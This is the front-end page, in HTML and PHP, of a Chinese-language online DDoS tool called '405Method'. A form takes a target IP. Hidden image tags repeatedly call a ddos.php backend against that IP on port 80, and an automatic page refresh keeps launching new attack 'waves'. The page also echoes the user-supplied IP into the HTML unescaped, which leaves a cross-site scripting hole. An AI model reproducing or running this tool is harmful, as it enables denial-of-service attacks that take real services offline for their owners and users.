<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta http-equiv="Cache-Control" content="max-age=0" forua="true"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Expires" content="0"/>
<link rel="stylesheet" href="css.css" type="text/css"/>
<link href="//netdna.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
<style>
*{font-family:'Microsoft Yahei';}
.bs-callout{margin:20px 0;padding:15px 30px 15px 15px;border-left:5px solid #eee;}.bs-callout-danger{background-color:#fcf2f2;border-color:#dFb5b4;}.bs-callout-warning{background-color:#fefbed;border-color:#f1e7bc;}.bs-callout-info{background-color:#f0f7fd;border-color:#d0e3f0;}.bs-callout-success{background-color:#f4f9ef;border-color:#d6e9c6;}
h4 {font-weight: bold;}
</style>
<title>405Method在线DDOS工具</title>
</head>
<body>

<div class="container">

<div class="panel panel-default">
    <div class="panel-heading">
      <class="panel-title"><h3>405Method在线DDOS工具 <span class="label label-success" style="float: right;" onclick="window.open('/', '_new')"><strong><i class="fa fa-qq"></i>405Method</strong></span></h3>
    </div>
	
    <div class="input-group has-warning">
        <span class="input-group-addon input-lg">目标ip只支持80端口</span>
		<form method="GET" action="index.php">
        <input type="text" name="hm" maxlength="15" class="form-control input-lg" placeholder="输入需要ip" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动DDOS</button>
		<button type="button" class="btn btn-success" onclick="top.location='index.php'">停止DDOS</button>
		<button type="button" class="btn btn-primary" target="_blank" onclick="top.location='https://405notallowed.com'">联系思念</button>

		</div>
		</form>


<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a-1;
$d=$_GET['hm'];
?>
<div class="tip">
<?php
$i=127;//想要屏蔽的ip
if($i==$d){
   echo "<br><br><H4>本ip禁止发送DDOS</H4>";
}
if($i!=$d and $d>1){
    echo"   <br /><div class='progress progress-striped active'><div class='progress-bar progress-bar-success' style='width: 100%'>DDOS进行中</div></div><div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>ddos攻击已经启动,  对<strong>$d</strong>,正在发起<strong>$e</strong>.波DDOS,</div></div>";
    echo "<div style='display:none'>
<img src='http://127.0.0.1/ddos.php?ip=$d&port=80&time=1' alt=''/>
<img src='/ddos.php?ip=$d&port=80&time=1' alt=''/>
<img src='http://127.0.0.1/ddos.php?ip=$d&port=80&time=1' alt=''/>
</div>";
     echo"<meta http-equiv=refresh content='0; url=index.php?hm=$d&amp;c=$a'";
}
?>
</div>
</body>
</html>
